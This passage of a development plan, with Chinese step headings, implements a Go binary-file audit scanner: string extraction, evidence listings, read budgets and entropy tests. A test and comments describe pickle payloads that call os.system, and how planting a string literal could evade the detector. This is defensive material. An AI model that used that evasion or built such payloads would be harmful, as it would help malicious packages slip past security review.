// feature exists to close. The asymmetry is why the cheaper error is the one
// taken.
func looksBinary(head []byte) bool {
	return bytes.IndexByte(head, 0x00) >= 0
}
```

- [ ] **Step 4: 跑测试确认通过**

```bash
go test ./internal/codeaudit/ -run 'TestClassifyBinary' -v
```

预期：13 个 subtest 全 PASS。

- [ ] **Step 5: 提交**

```bash
git add internal/codeaudit/binary_detect.go internal/codeaudit/binary_detect_test.go
git commit -m "feat(audit): classify binary files by content, with extension fallback"
```

---

### Task 2: 证据行类型与流式 strings 抽取

**Files:**
- Create: `internal/codeaudit/binary_evidence.go`
- Test: `internal/codeaudit/binary_evidence_test.go`

- [ ] **Step 1: 写失败测试**

创建 `internal/codeaudit/binary_evidence_test.go`：

```go
package codeaudit

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// newTestEvidence builds an empty set for the extractor tests to fill.
func newTestEvidence(path string, kind BinaryKind) *EvidenceSet {
	return &EvidenceSet{File: path, Kind: kind, seen: map[string]bool{}}
}

func TestStringScannerKeepsRunsAtOrAboveTheMinimum(t *testing.T) {
	data := []byte("ab\x00abcd\x00abcde\x00")
	ev := newTestEvidence("x.bin", KindRaw)

	s := newStringScanner(ev, DefaultBinaryConfig())
	if _, err := s.Write(data); err != nil {
		t.Fatalf("write: %v", err)
	}
	s.Flush()

	var got []string
	for _, l := range ev.Lines {
		if l.Source == SourceStrings {
			got = append(got, l.Text)
		}
	}
	want := []string{"abcd", "abcde"}
	if strings.Join(got, ",") != strings.Join(want, ",") {
		t.Errorf("strings = %v, want %v (a 2-byte run is below the 4-byte minimum)", got, want)
	}
}

// TestStringScannerCarriesRunsAcrossChunks pins the boundary behaviour: the
// stream is read in chunks, and a run split by the chunk edge is one string, not
// two. Without the carry the extractor would miss every literal that happens to
// straddle a 64 KiB read, which is a silent and input-dependent loss.
func TestStringScannerCarriesRunsAcrossChunks(t *testing.T) {
	ev := newTestEvidence("x.bin", KindRaw)
	s := newStringScanner(ev, DefaultBinaryConfig())

	if _, err := s.Write([]byte("hello/world")); err != nil {
		t.Fatal(err)
	}
	if _, err := s.Write([]byte("tail")); err != nil {
		t.Fatal(err)
	}
	s.Flush()

	if len(ev.Lines) != 1 || ev.Lines[0].Text != "hello/worldtail" {
		t.Fatalf("lines = %+v, want one line \"hello/worldtail\"", ev.Lines)
	}
}

// TestStringScannerRecordsTheOffsetOfTheFirstOccurrence pins both the offset
// semantics and the deduplication: a literal repeated a thousand times is one
// evidence line, tagged with where it first appeared.
func TestStringScannerRecordsTheOffsetOfTheFirstOccurrence(t *testing.T) {
	ev := newTestEvidence("x.bin", KindRaw)
	s := newStringScanner(ev, DefaultBinaryConfig())

	if _, err := s.Write([]byte("\x00\x00\x00abcdef")); err != nil {
		t.Fatal(err)
	}
	if _, err := s.Write([]byte("\x00abcdef\x00")); err != nil {
		t.Fatal(err)
	}
	s.Flush()

	if len(ev.Lines) != 1 {
		t.Fatalf("lines = %+v, want the duplicate dropped", ev.Lines)
	}
	if ev.Lines[0].Offset != 3 {
		t.Errorf("offset = %d, want 3 (the first occurrence)", ev.Lines[0].Offset)
	}
}

func TestStringScannerCapsDistinctLinesAndRecordsIt(t *testing.T) {
	cfg := DefaultBinaryConfig()
	cfg.MaxEvidenceLines = 2
	ev := newTestEvidence("x.bin", KindRaw)
	s := newStringScanner(ev, cfg)

	if _, err := s.Write([]byte("aaaa\x00bbbb\x00cccc\x00")); err != nil {
		t.Fatal(err)
	}
	s.Flush()

	if len(ev.Lines) != 2 {
		t.Fatalf("lines = %d, want the cap of 2", len(ev.Lines))
	}
	if !ev.Bound.Listing {
		t.Error("Bound.Listing = false after the line cap fired; the loss is invisible")
	}
}

// TestEvidenceSourcesDoNotShareADedupKey pins that the dedup key is namespaced
// by source. All writers share one map, so a bare-text key lets one source
// silence another: a model package whose string table contains the printable
// literal "pickle:os.system" would occupy the key the pickle pass needs for a
// genuine GLOBAL os.system target, and the rule that exists to catch "this file
// unpickles a call to os.system" would never see it. That is an evasion an
// attacker who controls the package can plant on purpose, so the string line and
// the pickle line must both survive.
func TestEvidenceSourcesDoNotShareADedupKey(t *testing.T) {
	ev := newTestEvidence("x.bin", KindPickle)
	s := newStringScanner(ev, DefaultBinaryConfig())
	if _, err := s.Write([]byte("pickle:os.system")); err != nil {
		t.Fatal(err)
	}
	s.Flush()

	// The pickle scanner (Task 4) writes its targets through the same method.
	ev.add(SourcePickle, 0, "os.system")

	var sawString, sawPickle bool
	for _, l := range ev.Lines {
		if l.Source == SourceStrings && l.Text == "pickle:os.system" {
			sawString = true
		}
		if l.Source == SourcePickle && l.Text == "os.system" {
			sawPickle = true
		}
	}
	if !sawString {
		t.Error("the string line was removed; one source overwrote another's evidence")
	}
	if !sawPickle {
		t.Error("the pickle target was dropped; a planted string literal silenced the pickle pass")
	}
}

// TestStringScannerNormalizesAZeroConfig pins that the config is normalized
// where it is consumed. A zero BinaryConfig gives MaxStringLen == 0, which the
// scanner would read as "no byte may enter a run" while MinStringLen == 0 still
// let flush emit a phantom empty line - every real string lost, and a listing
// bound recorded instead of a structural one, which is a silent failure of
// exactly the kind this completeness scheme exists to prevent.
func TestStringScannerNormalizesAZeroConfig(t *testing.T) {
	ev := newTestEvidence("x.bin", KindRaw)
	s := newStringScanner(ev, BinaryConfig{})
	if _, err := s.Write([]byte("hello world")); err != nil {
		t.Fatal(err)
	}
	s.Flush()

	if len(ev.Lines) != 1 || ev.Lines[0].Text != "hello world" {
		t.Fatalf("lines = %+v, want one line \"hello world\"", ev.Lines)
	}
	if ev.Bound.Listing {
		t.Error("Bound.Listing = true: a zero config was recorded as a listing bound instead of being normalized")
	}
}

// TestStreamEvidenceReadsTheWholeFile pins that the pass is not silently
// bounded: a literal past the first read chunk is found, and an unbounded pass
// reports no bound at all.
func TestStreamEvidenceReadsTheWholeFile(t *testing.T) {
	dir := t.TempDir()
	// 200 KiB of filler, then the literal: comfortably past the 64 KiB read
	// chunk, so a pass that stopped early would miss it.
	filler := make([]byte, 200*1024)
	for i := range filler {
		filler[i] = byte(i*7 + 1) // never 0x00, so the run would swallow the literal
	}
	content := append(append([]byte{}, filler...), []byte("\x00CURLY_MARKER\x00")...)
	path := writeTestBytes(t, dir, "blob.bin", content)

	ev := newTestEvidence(path, KindRaw)
	if err := streamEvidence(path, ev, DefaultBinaryConfig(), DefaultBinaryConfig().MaxStreamBytes); err != nil {
		t.Fatalf("streamEvidence: %v", err)
	}
	if ev.Bound.Structural {
		t.Fatalf("Bound.Structural = true on a file inside every limit: %+v", ev.Bound)
	}

	found := false
	for _, l := range ev.Lines {
		if l.Text == "CURLY_MARKER" {
			found = true
		}
	}
	if !found {
		t.Error("the literal past the first read chunk is missing from the evidence")
	}
}

// TestStreamEvidenceStopsAtTheStreamBudget pins the budget path. A file over the
// configured ceiling is read up to the ceiling and the shortfall is recorded —
// not silently ignored, which is the failure mode the whole completeness scheme
// in this package exists to prevent.
func TestStreamEvidenceStopsAtTheStreamBudget(t *testing.T) {
	dir := t.TempDir()
	content := append(make([]byte, 128), []byte("\x00BEYOND_THE_BUDGET\x00")...)
	content[0] = 'A' // keep it readable so the run below is not the literal itself
	path := writeTestBytes(t, dir, "big.bin", content)

	ev := newTestEvidence(path, KindRaw)
	if err := streamEvidence(path, ev, DefaultBinaryConfig(), 32); err != nil {
		t.Fatalf("streamEvidence: %v", err)
	}
	if !ev.Bound.Structural {
		t.Error("Bound.Structural = false after the stream budget cut the read")
	}
	for _, l := range ev.Lines {
		if l.Text == "BEYOND_THE_BUDGET" {
			t.Error("evidence beyond the stream budget was read anyway; the budget is not a budget")
		}
	}
}

// writeTestBytes writes raw bytes; writeTestFile takes a string and cannot carry
// a NUL.
func writeTestBytes(t *testing.T, dir, name string, content []byte) string {
	t.Helper()
	path := filepath.Join(dir, name)
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, content, 0o644); err != nil {
		t.Fatal(err)
	}
	return path
}
```

- [ ] **Step 2: 跑测试确认失败**

```bash
go test ./internal/codeaudit/ -run 'TestString|TestStream' 2>&1 | head -20
```

预期：编译失败，`undefined: EvidenceSet`。

- [ ] **Step 3: 实现证据类型与 strings 抽取器**

创建 `internal/codeaudit/binary_evidence.go`：

```go
package codeaudit

import (
	"fmt"
	"io"
	"os"
	"sort"
	"strings"
)

// EvidenceSource names where one evidence line came from.
//
// It is carried on the line so that a rule can restrict itself to the sources
// it is meaningful for, and so that the limitation is expressed once, in the
// rule table, rather than re-derived at every comparison. The distinction is
// load-bearing: "connect" as a dynamic import is a call the binary can make,
// and the same bytes in a string table are a message it can print. Only the
// first is evidence of network capability.
type EvidenceSource string

const (
	// SourceStrings is a printable byte run extracted from the file.
	SourceStrings EvidenceSource = "strings"
	// SourceDynsym is a name in the dynamic symbol table — a symbol the binary
	// imports from a library. It is the only evidence a stripped binary retains.
	SourceDynsym EvidenceSource = "dynsym"
	// SourceNeeded is a DT_NEEDED entry: a library the loader will bring in.
	SourceNeeded EvidenceSource = "needed"
	// SourceSection is a section's name, size and executability.
	SourceSection EvidenceSource = "section"
	// SourceEntropy is an entropy verdict, already computed from measurements.
	SourceEntropy EvidenceSource = "entropy"
	// SourceMember is a container member's name and size.
	SourceMember EvidenceSource = "member"
	// SourcePickle is a module.attribute pair a pickle stream asks the unpickler
	// to resolve.
	SourcePickle EvidenceSource = "pickle"
	// SourceNotice is a property of the file itself that is neither a match nor
	// a measurement: the interpreter it names, the format that was recognised
	// but not structurally parsed.
	SourceNotice EvidenceSource = "notice"
)

// EvidenceLine is one line of the evidence listing a file yields. It is the
// single representation every extractor produces and every rule matches
// against, which is what lets the rule table be written once for ELF symbols,
// file literals and container members alike.
type EvidenceLine struct {
	// Index is the line's 1-based position in the finished listing. It is what
	// Finding.Line carries for a binary finding, so it is assigned once, after
	// the listing is sorted, and never moves.
	Index int
	// Source is where the text came from.
	Source EvidenceSource
	// Offset is the byte offset in File the evidence was read at. Structured
	// evidence that names a property of the file rather than a byte range - a
	// container member, a section summary, an entropy verdict - carries zero.
	Offset int64
	// Text is what a rule matches against. It is deliberately the bare value and
	// not a pre-formatted line: a rule that had to parse its own rendering would
	// couple every pattern to the rendering.
	Text string
}

// Bounding records which limits an extraction hit, split by what the limit
// cost. The split is the difference between a report that says "we read
// everything and found this" and one that says "we read part of it".
type Bounding struct {
	// Structural is set when extraction of the file's structure was cut short:
	// an ELF section not read, a container member never opened, a stream that
	// ended at the byte budget. For a format that can execute, this withholds a
	// clean-scan verdict, because the unread part is exactly where a payload
	// would live.
	Structural bool
	// Listing is set when the evidence listing hit its line cap. The file was
	// read; not every distinct string in it is in the report. This is recorded
	// because a reader should be able to see it, and it does not withhold a
	// verdict on its own: a binary with sixty thousand distinct strings is a
	// large binary, not an unexamined one.
	Listing bool
	// Reason names the limit that fired, for the report. It is a string rather
	// than an enum so that adding a limit does not change a wire type.
	Reason string
}

// EvidenceSet is the whole evidence listing for one file, plus what is known
// about how completely it was gathered.
type EvidenceSet struct {
	File string
	Kind BinaryKind
	Size int64
	// Lines is the finished listing, sorted and indexed. Extractors append
	// unordered; Finalize assigns Index.
	Lines []EvidenceLine
	// Bound records the limits that fired during extraction.
	Bound Bounding
	// Err is set when the file could not be examined at all. A file with an
	// error is one the scan did not look at, which is a different claim from a
	// file it looked at and found nothing in.
	Err error

	// seen is the deduplication set. It is unexported because it is an
	// implementation detail of the extractors, not part of what a reader gets.
	seen map[string]bool
	// maxLines is the evidence line cap, resolved from the config by
	// newEvidenceSet so that add - which every extractor calls - can enforce it
	// without every caller carrying the config. newStringScanner sets it too,
	// which is idempotent and keeps the cap on a set built by hand for the string
	// path. Zero means unlimited, so a set built literally and handed to neither
	// is uncapped: evidenceError is the only such set on a real path, and it is
	// safe because a failed extraction has nothing appended to it. The test helper
	// newTestEvidence builds one as well and relies on the trivial volume.
	maxLines int
}

// newEvidenceSet builds the set for one file and resolves the config's line cap
// here, once. Every extraction path must come through this rather than filling
// the struct literally: a set built by hand leaves maxLines at zero, and add
// reads zero as "unlimited", so the one path that forgot would silently lose the
// per-file memory ceiling - which is exactly what the structured extractors,
// none of which touch the string scanner, would otherwise all do.
func newEvidenceSet(file string, kind BinaryKind, cfg BinaryConfig) *EvidenceSet {
	cfg = normalizeBinaryConfig(cfg)
	return &EvidenceSet{
		File:     file,
		Kind:     kind,
		seen:     map[string]bool{},
		maxLines: cfg.MaxEvidenceLines,
	}
}

// markStructural records that the extraction of the file's structure was cut
// short. The first reason wins, so the report names the limit that was reached
// first rather than the last one a loop happened to notice.
//
// It lives here rather than with the extractors that call it most, because the
// stream budget in streamEvidence is the first caller: this task's own tests
// assert on the flag it sets.
func (s *EvidenceSet) markStructural(reason string) {
	if s.Bound.Structural {
		return
	}
	s.Bound.Structural = true
	s.Bound.Reason = reason
}

// markListing records that evidence lines were dropped by the listing cap, or
// that one line was cut short at MaxStringLen. A listing never relabels a reason
// already recorded - it writes only when Reason is empty - while a structural
// reason does override one, because markStructural guards on Structural rather
// than on Reason. That is the precedence we want: a structural limit is what
// withholds a clean verdict, and a listing note that only affects what is
// displayed must not speak for it. Among reasons of the same class the first
// wins.
func (s *EvidenceSet) markListing(reason string) {
	s.Bound.Listing = true
	if s.Bound.Reason == "" {
		s.Bound.Reason = reason
	}
}

// add records one evidence line, deduplicating on the pair (source, text).
//
// Every writer shares this map, so the key is namespaced by source. An
// unnamespaced key lets one source silence another: a file containing the
// printable literal "pickle:os.system" would otherwise occupy the key the
// pickle pass uses for a genuine GLOBAL target, and the rule that exists to
// catch "this file unpickles a call to os.system" would never see it. The NUL
// separator cannot occur in string evidence, because isPrintableByte rejects
// it, so two sources cannot build the same key.
//
// A line dropped by the cap is deliberately not recorded in the map: the map's
// length is the live line count the cap is measured against, so recording it
// would grow the structure without bound and defeat the ceiling the cap exists
// for.
func (s *EvidenceSet) add(src EvidenceSource, off int64, text string) {
	if s.seen == nil {
		s.seen = map[string]bool{}
	}
	key := string(src) + "\x00" + text
	if s.seen[key] {
		return
	}
	if s.maxLines > 0 && len(s.seen) >= s.maxLines {
		s.markListing("evidence line cap reached")
		return
	}
	s.seen[key] = true
	s.Lines = append(s.Lines, EvidenceLine{Source: src, Offset: off, Text: text})
}

// DefaultBinaryMinStringLen is the shortest printable run kept as evidence. It
// matches the default of strings(1): shorter runs are dominated by machine code
// and byte noise, and the short names that matter - socket, connect, execve -
// are at or above it.
const DefaultBinaryMinStringLen = 4

// DefaultBinaryMaxStringLen is how much of one printable run is kept. A long
// blob is truncated rather than split, so one blob is one line; the truncation
// is recorded as a listing bound.
const DefaultBinaryMaxStringLen = 1024

// evidenceReadChunk is the read size for the streaming passes. It is the unit
// the string carry works across, so it is a constant rather than a tunable.
const evidenceReadChunk = 64 * 1024

// stringScanner turns a byte stream into evidence lines: one per run of
// printable bytes at least MinStringLen long, deduplicated, each tagged with the
// offset of its first occurrence.
type stringScanner struct {
	cfg   BinaryConfig
	set   *EvidenceSet
	at    int64
	run   []byte
	runAt int64
	// truncated marks that a run hit MaxStringLen, which is a listing bound: the
	// tail of that run is not in the listing.
	truncated bool
}

func newStringScanner(set *EvidenceSet, cfg BinaryConfig) *stringScanner {
	// The config is normalized here rather than trusted from the caller: this is
	// the function that consumes it, and a zero value would be read as "no byte
	// may enter a run" while still emitting a line, so a mis-set config would
	// silently lose every string and record a listing bound instead of failing
	// loudly.
	cfg = normalizeBinaryConfig(cfg)
	set.maxLines = cfg.MaxEvidenceLines
	return &stringScanner{set: set, cfg: cfg}
}

// Write implements io.Writer. The run is carried across calls, so a literal
// split by a chunk boundary is still one string.
func (s *stringScanner) Write(p []byte) (int, error) {
	for _, b := range p {
		if isPrintableByte(b) {
			if len(s.run) == 0 {
				s.runAt = s.at
			}
			if len(s.run) < s.cfg.MaxStringLen {
				s.run = append(s.run, b)
			} else {
				s.truncated = true
			}
		} else {
			s.flush()
		}
		s.at++
	}
	return len(p), nil
}

// Flush emits the run in progress. It must be called once at end of stream; a
// trailing run is otherwise dropped, which is the kind of loss that only shows
// up on files ending in a literal.
func (s *stringScanner) Flush() {
	s.flush()
	if s.truncated {
		s.set.markListing("string truncated at MaxStringLen")
	}
}

func (s *stringScanner) flush() {
	if len(s.run) >= s.cfg.MinStringLen {
		s.emit(string(s.run), s.runAt)
	}
	s.run = s.run[:0]
}

// emit records one distinct string. The first occurrence wins, so a literal
// repeated through a file is one line tagged with where it starts.
func (s *stringScanner) emit(text string, at int64) {
	s.set.add(SourceStrings, at, text)
}

// isPrintableByte is the printable-ASCII predicate strings(1) uses, plus tab.
// Bytes above 0x7e are excluded rather than decoded: a UTF-8 literal split
// across a chunk boundary would otherwise be emitted half-formed, and the
// ASCII subset is where the paths, URLs and symbol names are.
func isPrintableByte(b byte) bool {
	return b >= 0x20 && b <= 0x7e || b == '\t'
}

// streamEvidence runs the byte-oriented extractors over one file.
//
// budget is the maximum number of bytes the pass may read, and it is enforced
// inside the read rather than between reads: checking it only at the top of the
// loop lets a single 64 KiB read walk straight past a 32-byte budget, which
// makes the budget a decoration. Whether the file was too large is decided up
// front from its size, so that a file that ends exactly at the budget is not
// reported as bounded - a bound that did not cost anything is not a bound.
//
// This pass extracts strings only. The pickle interpreter is a second reader over
// the same bytes and is wired in by Task 4, gated on set.Kind == KindPickle (the
// gate rule is stated there); the shape of that patch is written out there.
func streamEvidence(path string, set *EvidenceSet, cfg BinaryConfig, budget int64) error {
	f, err := os.Open(path)
	if err != nil {
		return fmt.Errorf("open %s: %w", path, err)
	}
	defer f.Close()

	if info, statErr := f.Stat(); statErr == nil && budget > 0 && info.Size() > budget {
		set.markStructural(fmt.Sprintf("stream budget %d bytes reached (file is %d)", budget, info.Size()))
	}

	scanner := newStringScanner(set, cfg)

	var read int64
	buf := make([]byte, evidenceReadChunk)
	for {
		limit := len(buf)
		if budget > 0 && int64(limit) > budget-read {
			limit = int(budget - read)
		}
		if limit <= 0 {
			break // the budget is spent; the bound was recorded above
		}
		n, readErr := f.Read(buf[:limit])
		if n > 0 {
			chunk := buf[:n]
			if _, wErr := scanner.Write(chunk); wErr != nil {
				return fmt.Errorf("scan %s: %w", path, wErr)
			}
			read += int64(n)
		}
		if readErr == io.EOF {
			break
		}
		if readErr != nil {
			return fmt.Errorf("read %s: %w", path, readErr)
		}
	}
	scanner.Flush()
	return nil
}

// Finalize sorts and indexes a finished listing.
//
// The order has to be independent of how the evidence was gathered, because
// Finding.Line is an index into this list: an order that varied between runs
// would make the same finding report a different line each time, and two
// reports of the same file would stop being diffable. The sort key is
// (Offset, Source, Text) - byte order first, so the listing reads front to back.
// Structural evidence leads because it carries offset 0 while real evidence
// usually carries a positive offset, which puts "what the file is" before "what
// it says"; a string that genuinely starts at offset 0 interleaves with it, and
// that is fine. The comparator does not special-case the source, so exact
// (Offset, Source, Text) ties are broken by SliceStable's insertion order - the
// key is not total, but tied lines are byte-identical and interchangeable, so
// which one lands first cannot change a finding.
func (s *EvidenceSet) Finalize() {
	for i := range s.Lines {
		s.Lines[i].Index = 0
	}
	sort.SliceStable(s.Lines, func(i, j int) bool {
		if s.Lines[i].Offset != s.Lines[j].Offset {
			return s.Lines[i].Offset < s.Lines[j].Offset
		}
		if s.Lines[i].Source != s.Lines[j].Source {
			return s.Lines[i].Source < s.Lines[j].Source
		}
		return s.Lines[i].Text < s.Lines[j].Text
	})
	for i := range s.Lines {
		s.Lines[i].Index = i + 1
	}
}

// Render draws the listing as the numbered lines the Tier 2 prompt shows. The
// index it prints is EvidenceLine.Index, so a line the model names is a line the
// report can be searched for. It expects a set that has been through Finalize:
// Index is zero until then, so calling it earlier prints 0 for every line and
// disables the maxLines cutoff.
func (s *EvidenceSet) Render(maxLines int) string {
	var b strings.Builder
	for _, l := range s.Lines {
		if maxLines > 0 && l.Index > maxLines {
			fmt.Fprintf(&b, "... (%d more evidence line(s) not shown)\n", len(s.Lines)-maxLines)
			break
		}
		fmt.Fprintf(&b, "%d\t[%s] %s\n", l.Index, l.Source, l.Text)
	}
	return strings.TrimRight(b.String(), "\n")
}
```

- [ ] **Step 4: 加最小 `BinaryConfig` 让本 Task 独立可测**

本 Task 只用到 `MinStringLen`、`MaxStringLen`、`MaxEvidenceLines`、`MaxStreamBytes` 四个字段，但 `DefaultBinaryConfig()` 要一次给全（后续 Task 不再改它）。追加到 `binary_evidence.go` 末尾：

```go
// BinaryConfig bounds one binary scan. The zero value is not usable: a config
// with no limits would read a terabyte and hold every distinct string in it in
// memory, so callers go through DefaultBinaryConfig and the collector resolves
// any zero field back to the default rather than treating zero as "unlimited".
type BinaryConfig struct {
	// Enabled turns the binary channel on for an audit run. Off means the report
	// is byte-identical to the one produced before this channel existed, which
	// is what makes turning it off a rollback.
	Enabled bool
	// MinStringLen is the shortest printable run kept as evidence.
	MinStringLen int
	// MaxStringLen is how much of one run is kept before it is truncated.
	MaxStringLen int
	// MaxEvidenceLines caps distinct evidence lines per file.
	MaxEvidenceLines int
	// MaxStreamBytes bounds how much of one file the streaming pass reads.
	MaxStreamBytes int64
	// MaxFullScanBytes is the size above which a file is no longer streamed end to
	// end, and only its head and tail are read. The number is set from the corpus
	// this platform actually audits rather than from a guess: the largest file in
	// the example package that reaches a full pass is a 10.8 MiB protocol-2 pickle,
	// with .pyc files at 45-58 KiB and the MNIST blobs at ~10 MiB behind it. 64 MiB
	// leaves six times the headroom over the largest of them, so no file in that
	// corpus changes behaviour, and at the measured 338 MB/s it caps the work one
	// file can cost at about 190 ms.
	MaxFullScanBytes int64
	// HeadTailBytes is the window read from each end of a file above
	// MaxFullScanBytes. One mebibyte is what makes an appended payload visible: a
	// zip's directory and the pickle stapled after the last member are both within
	// it of one end or the other.
	HeadTailBytes int64
	// There is deliberately no per-section byte cap, and its absence is a decision
	// rather than an omission. An earlier design had MaxSectionBytes and read each
	// executable section with io.ReadAll under it; the cap fired on ordinary real
	// libraries - .text of a large shared object crosses any fixed section cap once
	// the library is big enough - and a firing cap is a structural bound, so it
	// blocked a package because a library was merely large. The section read now
	// streams through the entropy histogram in fixed-size chunks (see
	// countSection), so memory is O(1) regardless of section size and there is
	// nothing for a per-section cap to protect. The remaining per-ELF bound is
	// MaxStreamBytes, applied as a per-file budget over the sections this parse
	// reads; breaching *that* is what stays structural, and it takes three
	// gigabytes of executable sections to reach.
	// MaxArchiveMembers bounds how many container members are examined.
	MaxArchiveMembers int
	// MaxArchiveMemberBytes bounds the bytes of the ELF/pickle members read whole
	// across one container: the container's own total decompressed size is not
	// bounded, because a member that is neither an ELF nor a pickle is classified
	// and skipped without being read into memory.
	MaxArchiveMemberBytes int64
	// MaxFindings is a listing budget across the whole binary pass, not a bound on
	// the verdict.
	//
	// It is deliberately not the source scanner's cap. The two channels are capped
	// separately and the merge re-truncates neither: a shared ceiling would let a
	// large source arm evict binary findings by path order - and the binary arm is
	// the only one that can see a .so or a pickle at all - and it would choose
	// which findings to drop by path order rather than by importance.
	//
	// Reaching it does not withhold a pass. The cap drops LOW findings and only
	// LOW (see BinaryScanner.ScanDirectory): HIGH blocks under `assist` and
	// `gate`, MEDIUM blocks under `gate`, and both are kept whatever the budget.
	// The drop is recorded on the summary as findings_capped/findings_dropped
	// rather than folded into Report.Truncated, which ProvesCleanScan refuses on:
	// a channel that deleted a package for having found too much would be a
	// channel the operator has to tune against, and tuning it is the one thing a
	// fail-closed control must not require.
	//
	// 50 because the evidence families number ten
	// (NET_002/CMD_001/CMD_002/DYN_001/PKL_001/BIN_001/BIN_002/PER_002/FIL_002/
	// ENV_002): fifty findings is five instances of every family, far past the
	// point where another instance changes the verdict. Nothing recorded comes
	// near it - the highest finding count in any stored report in this repository
	// is 7 for one sample and 80 for a whole 100-sample corpus, and 80 is a corpus
	// total rather than one package's. Worst case LLM calls go from 200 to 250, and
	// only when both arms saturate, and the binary arm can exceed its own budget
	// when the extra findings are HIGH.
	MaxFindings int
	// HighEntropyThreshold is the bits-per-byte above which a section or file is
	// called near-random. Compiled code sits near 6.0-6.5; 7.5 is far enough
	// above that a normal binary does not reach it and far enough below 8.0 that
	// a compressed or encrypted payload does.
	HighEntropyThreshold float64
	// SkipDirs is the directory-name skip set, shared in spirit with the source
	// scanner's. It is a field rather than a shared global so that a test can
	// state its own.
	SkipDirs map[string]bool
}

// DefaultBinaryConfig returns the configuration a deployment gets when it says
// nothing.
func DefaultBinaryConfig() BinaryConfig {
	return BinaryConfig{
		Enabled:               true,
		MinStringLen:          DefaultBinaryMinStringLen,
		MaxStringLen:          DefaultBinaryMaxStringLen,
		MaxEvidenceLines:      50000,
		MaxStreamBytes:        3 * 1024 * 1024 * 1024,
		MaxFullScanBytes:      64 * 1024 * 1024,
		HeadTailBytes:         1 << 20,
		MaxArchiveMembers:     4096,
		MaxArchiveMemberBytes: 256 * 1024 * 1024,
		// Not DefaultConfig().MaxFindings: the two channels are capped
		// independently and the merge re-truncates neither. It is a listing budget
		// rather than a completeness bound - reaching it never withholds a pass.
		// See the field comment.
		MaxFindings:          50,
		HighEntropyThreshold: 7.5,
		SkipDirs:             DefaultConfig().SkipDirs,
	}
}

// normalizeBinaryConfig resolves every zero field back to its default. It is
// what lets the collector treat a zero as "unset" instead of "unlimited", which
// for a memory bound is the difference between a limit and no limit at all.
func normalizeBinaryConfig(cfg BinaryConfig) BinaryConfig {
	def := DefaultBinaryConfig()
	if cfg.MinStringLen <= 0 {
		cfg.MinStringLen = def.MinStringLen
	}
	if cfg.MaxStringLen <= 0 {
		cfg.MaxStringLen = def.MaxStringLen
	}
	if cfg.MaxEvidenceLines <= 0 {
		cfg.MaxEvidenceLines = def.MaxEvidenceLines
	}
	if cfg.MaxStreamBytes <= 0 {
		cfg.MaxStreamBytes = def.MaxStreamBytes
	}
	if cfg.MaxFullScanBytes <= 0 {
		cfg.MaxFullScanBytes = def.MaxFullScanBytes
	}
	if cfg.HeadTailBytes <= 0 {
		cfg.HeadTailBytes = def.HeadTailBytes
	}
	if cfg.MaxArchiveMembers <= 0 {
		cfg.MaxArchiveMembers = def.MaxArchiveMembers
	}
	if cfg.MaxArchiveMemberBytes <= 0 {
		cfg.MaxArchiveMemberBytes = def.MaxArchiveMemberBytes
	}
	if cfg.MaxFindings <= 0 {
		cfg.MaxFindings = def.MaxFindings
	}
	if cfg.HighEntropyThreshold <= 0 {
		cfg.HighEntropyThreshold = def.HighEntropyThreshold
	}
	if cfg.SkipDirs == nil {
		cfg.SkipDirs = def.SkipDirs
	}
	return cfg
}

// isExecutableKind reports whether evidence from this kind can hide an executed
// payload when it is cut short.
//
// This is the whole of the asymmetry between the two bounding classes. An ELF, a
// pickle stream, a container that may hold either, and a compressed stream that
// may decompress to either, can all end in something that runs; a raw blob and a
// tensor archive cannot, on this platform, run at all. A bounded read of the
// first group is a scan that did not look; a bounded read of the second is a scan
// that looked at as much data as there was reason to.
func isExecutableKind(k BinaryKind) bool {
	switch k {
	case KindELF, KindPickle, KindArchive, KindCompressed:
		return true
	}
	return false
}

// evidenceError builds the set a failed extraction returns, so that the scanner
// has one shape to handle rather than two.
//
// Bound is left zeroed, which is only the right default if consumers consult Err
// before Bound: Structural is false here, so a reader that checked Bound first
// would see a failed extraction as a clean scan. Callers must treat Err as the
// first thing they look at.
func evidenceError(path string, kind BinaryKind, err error) *EvidenceSet {
	return &EvidenceSet{File: path, Kind: kind, seen: map[string]bool{}, Err: err}
}
```

- [ ] **Step 5: 跑测试确认通过**

```bash
go test ./internal/codeaudit/ -run 'TestString|TestStream|TestClassifyBinary' -v
```

预期全 PASS。若 `TestStreamEvidenceStopsAtTheStreamBudget` 失败并报 `content[0] = 'A'` 之后的 run 覆盖了字面量，检查 `streamEvidence` 的 budget 判断是否在 `Read` **之前**——放在之后会让最后一次读越过预算。

- [ ] **Step 6: 提交**

```bash
gofmt -l internal/codeaudit/binary_evidence.go
git add internal/codeaudit/binary_evidence.go internal/codeaudit/binary_evidence_test.go
git commit -m "feat(audit): add evidence listing and streaming string extraction for binaries"
```

---

### Task 3: 熵测量与加壳判定

**Files:**
- Modify: `internal/codeaudit/binary_evidence.go`
- Test: `internal/codeaudit/binary_evidence_test.go`

- [ ] **Step 1: 写失败测试**

追加到 `binary_evidence_test.go`：

```go
func TestShannonEntropy(t *testing.T) {
	t.Run("uniform over all 256 byte values is 8 bits", func(t *testing.T) {
		var counts [256]int64
		for i := range counts {
			counts[i] = 1
		}
		if got := shannonEntropy(counts, 256); math.Abs(got-8.0) > 1e-9 {
			t.Errorf("entropy = %v, want 8", got)
		}
	})

	t.Run("one repeated byte is zero bits", func(t *testing.T) {
		var counts [256]int64
		counts[0x41] = 4096
		if got := shannonEntropy(counts, 4096); got != 0 {
			t.Errorf("entropy = %v, want 0", got)
		}
	})

	t.Run("a fair coin is one bit", func(t *testing.T) {
		var counts [256]int64
		counts[0] = 500
		counts[1] = 500
		if got := shannonEntropy(counts, 1000); math.Abs(got-1.0) > 1e-9 {
			t.Errorf("entropy = %v, want 1", got)
		}
	})

	t.Run("empty input is zero rather than a division by zero", func(t *testing.T) {
		var counts [256]int64
		if got := shannonEntropy(counts, 0); got != 0 {
			t.Errorf("entropy = %v, want 0", got)
		}
	})

	t.Run("a total of zero returns zero rather than an infinity", func(t *testing.T) {
		// The histogram and the total are a pair the caller owns, and this
		// function exists in counts form precisely so a stream can be counted as
		// it is read - a caller can therefore hold a nonzero histogram and a zero
		// total. Without the guard the division yields an infinity that compares
		// false against every threshold, so a section would be reported as
		// unremarkable by accident. Note this is not the same as an all-zero
		// histogram, where the loop skips every byte and never divides.
		var counts [256]int64
		counts[0x41] = 5
		if got := shannonEntropy(counts, 0); got != 0 {
			t.Errorf("entropy = %v, want 0", got)
		}
	})
}

